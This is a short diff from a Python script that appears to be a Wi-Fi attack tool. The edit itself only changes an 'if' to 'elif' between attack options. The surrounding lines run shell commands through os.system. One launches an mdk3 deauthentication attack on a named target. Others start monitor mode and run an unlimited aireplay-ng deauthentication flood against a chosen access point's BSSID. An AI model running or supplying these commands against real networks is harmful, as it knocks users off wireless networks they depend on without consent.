@@ -57,7 +57,7 @@ print("")
 
 if attack == 1:
   os.system("monitor=`cat monitor.rmo`mon && tessid=`cat tessid.rmo` && mdk3 $monitor d -n '"+target+"'")
-if attack == 2:
+elif attack == 2:
   os.system("monitor=`cat monitor.rmo` && tchannel=`cat tchannel.rmo` && airmon-ng start $monitor $tchannel")
   os.system("monitor=`cat monitor.rmo` && tbssid=`cat tbssid.rmo` && aireplay-ng -0 0 -a $tbssid $monitor")
   os.system("monitor=`cat monitor.rmo` && airmon-ng stop $monitor")
